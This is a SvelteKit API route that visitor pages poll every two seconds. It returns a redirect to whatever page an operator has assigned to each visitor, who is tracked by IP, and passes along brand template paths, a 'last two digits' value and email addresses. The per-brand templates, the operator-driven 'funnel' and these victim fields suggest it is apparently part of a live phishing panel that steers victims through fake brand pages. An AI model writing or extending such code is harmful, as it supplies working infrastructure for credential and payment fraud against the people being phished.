/**
 * Visitor sync poll — admin redirects and overrides reach the browser here.
 *
 * Visitor pages poll this endpoint every ~2s. When the operator has set a
 * different `lastPageRoute` than the page the visitor is currently on, we
 * return the URL they should navigate to.
 *
 * Public endpoint — visitor templates must call it without auth.
 */
import { json, type RequestHandler } from '@sveltejs/kit';
import { serverState } from '$lib/server/state';
import { templateLabelToVisitorPath } from '$lib/server/visitorRouter';
import { labelToUrl } from '$lib/server/funnel';

function buildRedirectUrl(
	targetLabel: string,
	module: string,
	lastTwoDigits?: string,
	emailFrom?: string,
	emailTo?: string
): string | null {
	const path = templateLabelToVisitorPath(targetLabel, module);
	if (!path) return null;

	const qp = new URLSearchParams();
	if (lastTwoDigits) qp.set('last2', lastTwoDigits);
	if (emailFrom) qp.set('emailFrom', emailFrom);
	if (emailTo) qp.set('emailTo', emailTo);
	const qs = qp.toString();
	return qs ? `${path}?${qs}` : path;
}

export const GET: RequestHandler = async ({ url, getClientAddress }) => {
	const brand = url.searchParams.get('brand')?.trim() || '';
	const page = url.searchParams.get('page')?.trim() || '';
	const isPreview = url.searchParams.get('isPreview') || '';
	const ip = getClientAddress() || '';

	const visitor = serverState.visitors.get(ip);
	if (!visitor || visitor.status !== 'online') {
		return json({ redirectUrl: null, lastPageRoute: null }, { headers: { 'Cache-Control': 'no-store' } });
	}

	const currentRoute = brand && page ? `${brand}/${page}` : '';
	const targetRoute = visitor.lastPageRoute || visitor.lastPage || '';

	if (!targetRoute || !currentRoute || targetRoute === currentRoute) {
		return json(
			{ redirectUrl: null, lastPageRoute: targetRoute || null },
			{ headers: { 'Cache-Control': 'no-store' } }
		);
	}

	const redirectUrl = isPreview === 'true'
		? labelToUrl(targetRoute)
		: buildRedirectUrl(
			targetRoute,
			visitor.module,
			visitor.lastTwoDigits,
			visitor.emailFrom,
			visitor.emailTo
		);

	return json(
		{ redirectUrl, lastPageRoute: targetRoute },
		{ headers: { 'Cache-Control': 'no-store' } }
	);
};
